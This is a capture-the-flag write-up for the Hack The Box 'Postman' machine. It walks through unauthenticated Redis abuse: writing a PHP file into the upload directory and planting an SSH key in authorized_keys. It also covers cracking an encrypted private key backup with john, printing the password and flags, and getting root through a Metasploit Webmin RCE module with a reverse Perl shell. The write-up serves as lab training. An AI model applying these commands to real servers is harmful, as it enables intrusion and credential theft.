# Postman

### Enumeration
```bash
nmap -sC -sV -o scan.txt 10.129.2.1

```
![nmap](../../Assets/walktrhough-assets/postman/2025-02-11.png)

### Ports
- port 80 
- port 22 ubuntu
- port 10000 Miniserv

## Full Nmap Scan
The full scan `-p` finds another port.
- 6379/tcp open  redis   Redis key-value store 4.0.9


After discovering ports with nmap scan and visited the port `80` http has a plain html static site not much there to note except the email address `Postman@htb`. 

Port `10000` is running `MiniServ` hosting a `webmin` login page and a hostname leake for `https://postman:10000`. no results on the `Searchsploit` Add it to the /etc/host file

![Login page](../../Assets/walktrhough-assets/postman/2025-02-11_1.png)

### Gobuster

![gobuster](../../Assets/walktrhough-assets/postman/2025-02-12.png)

The /upload directory has images but the one that stands out is the `Cyber-security-web-banner.jpg`.
downloaded the image via `wget` and extracted the `metadata` 

```bash hl_lines="6"
➜  postman exiftool Cyber-security-web-banner.jpg 
ExifTool Version Number         : 13.10
File Name                       : Cyber-security-web-banner.jpg
Directory                       : .
File Size                       : 590 kB
File Modification Date/Time     : 2018:04:20 07:09:25-04:00
File Access Date/Time           : 2025:02:11 23:58:13-05:00
File Inode Change Date/Time     : 2025:02:11 23:58:13-05:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Comment                         : CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 95.
Image Width                     : 1920
Image Height                    : 865
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 1920x865
Megapixels                      : 1.7
```
This image was almost created the same time as the `index.html` which is interesting and good to note the date on these. 

```bash hl_lines="6"
 postman exiftool index.html                    
ExifTool Version Number         : 13.10
File Name                       : index.html
Directory                       : .
File Size                       : 3.8 kB
File Modification Date/Time     : 2019:08:25 14:34:23-04:00
File Access Date/Time           : 2025:02:12 00:08:30-05:00
File Inode Change Date/Time     : 2025:02:12 00:08:30-05:00
File Permissions                : -rw-rw-r--
File Type                       : HTML
File Type Extension             : html
MIME Type                       : text/html

```

# Redis port 6379
```bash
nc -v <ip> 6379
```
### Googled the Redis comands.
- **info** will print out some information the redis 
- `config_file:/etc/redis/redis.conf`
- config get *
- will give more information

It's a good idea to do a little search for webshell upload since there's an /upload directory.

##### Nmap script scan for redis
![](../../Assets/walktrhough-assets/postman/2025-02-12_1.png)

```bash hl_lines="3"
PORT     STATE SERVICE
6379/tcp open  redis
| redis-info: 
|   Version: 4.0.9
|   Operating System: Linux 4.15.0-58-generic x86_64
|   Architecture: 64 bits
|   Process ID: 659
|   Used CPU (sys): 4.83
|   Used CPU (user): 2.00
|   Connected clients: 2
|   Connected slaves: 0
|   Used memory: 841.96K
|   Role: master
|   Bind addresses: 
|     0.0.0.0
|     ::1
|   Client connections: 
|_    10.10.16.8
```
The ubuntu kernal version will tell when the server was update. google the version `4.15.0-58-generic` **2019** its kina matches when the `index.html` was update.

## Install Redis tools
```bash
sudo apt-get install redis-tools
```

## Redis Cli
https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/redis

```bash
redis-cli -h <ip>
redis-cli key *
config set dir /var/www/html/uplaod
config set dbfilename redis.php
set test "<?php phpinfo() ?>"
save
```

### Creating ssh key
```bash
ssh-keygen -t rsa -b 4096
```
Cat the postman.pub and add two line breaks at top and two at the buttom of the key.

```bash
cat postman.pub| redis-cli -h 10.129.2.1 -x set crackit
## Did not work
```

```bash
redis-cli -h 10.129.2.1
config set dir /home/test/.ssh
## Not a directory / permission issues
```
### Google redis home dir
```bash
config set dir /var/lib/redis
config set dir /var/lib/redis/.ssh
config set dbfilename "authorized_keys"
save
```
## Outpub
```bash
10.129.2.1:6379> config set dir /var/lib/redis
OK
10.129.2.1:6379> config set dir /var/lib/redis/.ssh
OK
10.129.2.1:6379> config set dbfilename "authorized_keys"
OK
10.129.2.1:6379> save
OK
10.129.2.1:6379> 
```

### SSH Login
```bash
chmod 600 postman
ssh -i postman redis@10.129.2.1
```
## Gained Shell
```bash
ls -la
find . -writeble
```

### Output
```bash
redis@Postman:~$ find . writeble
.
./ibortfgq.so
./.bash_history
./.gnupg
./.gnupg/private-keys-v1.d
./.ssh
./.ssh/authorized_keys
./dkixshbr.so
./.local
./.local/share
./.local/share/nano
./vlpaulhk.so
./.cache
./.cache/motd.legal-displayed
./module.o
./6379
./6379/dump.rdb
./qcbxxlig.so
./redis.php
./dump.rdb
find: ‘writeble’: No such file or directory
redis@Postman:~$ 
```

## Permission Denied
```bash hl_lines="11 13 15"
redis@Postman:/$ ls
bin   dev  home        initrd.img.old  lib64	   media  opt	root  sbin  swapfile  tmp  var	    vmlinuz.old
boot  etc  initrd.img  lib	       lost+found  mnt	  proc	run   srv   sys       usr  vmlinuz  webmin-setup.out
redis@Postman:/$ cd root
-bash: cd: root: Permission denied
redis@Postman:/$ cd home
redis@Postman:/home$ ls
Matt
redis@Postman:/home$ cd Matt/
redis@Postman:/home/Matt$ ls
user.txt
redis@Postman:/home/Matt$ cat user.txt
cat: user.txt: Permission denied
redis@Postman:/home/Matt$ 
```

## Linpeas.sh
Copy the linpeas.sh to the target via wget hosting the file on the kali via python3 
```bash
python3 -m htt.server

## target system cd > /dev/shm
wget http://<kali-ip>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
![](../../Assets/walktrhough-assets/postman/2025-02-12_3.png)

While waiting for the linpeas to complet let's find out when was user `Matt` logged in.

```bash
find / -newermt 2019-09-10 ! -newermt 2019-09-13 -ls 2>/dev/null
```
### Output
```bash
redis@Postman:/dev/shm$ find / -newermt 2019-09-10 ! -newermt 2019-09-13 2>/dev/null
/opt
/home
/home/Matt
/home/Matt/.bash_history
/var/log/journal/2cb57e052840450f9a54b149b131d24d/system@0005924475c9fb9b-0e787e1275733a5c.journal~
/var/log/journal/2cb57e052840450f9a54b149b131d24d/user-1000.journal
redis@Postman:/dev/shm$ 
```
## SSH to John
```bash
redis@Postman:/opt$ cat id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
...
```

First we need to conver this ssh to john Copy the id_rsa.bak to a file.ssh and run the below command to convert it.

```bash
python3 /opt/john/run/ssh2john.py postman.ssh 

## Output
postman.ssh:$sshng$0$8$73E9CEFBCCF5287C$1192$25e840e7....
```
crack the password with john
```bash
computer2008
```
We can `su` to math
```bash
su - Math

## Enter password computer2008
```
we can now access Math user.flag `7e43584cc8a4a7f75ccb585c93a2f955`

Using the same password to login to the `webmin` (Matt:computer2008)
![Login page](../../Assets/walktrhough-assets/postman/2025-02-11_1.png)

## Metasploit
Got root via metasploit  make sure the `ssl` is set to `true`
```bash
sf6 exploit(linux/http/webmin_package_updates_rce) > options

Module options (exploit/linux/http/webmin_package_updates_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   computer2008     no        Password to login with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.2.1       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                         /basics/using-metasploit.html
   RPORT      10000            yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path to Webmin
   URIPATH                     no        The URI to use for this exploit (default is random)
   USERNAME   Matt             yes       User to login with
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address o
                                       n the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.16.8       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix In-Memory



View the full module info with the info, or info -d command.

```

### root flag
```bash
cd ls -la /root
cat /root/root.txt
```
`47ddaaa1621955d26a50fdc3fed647e0`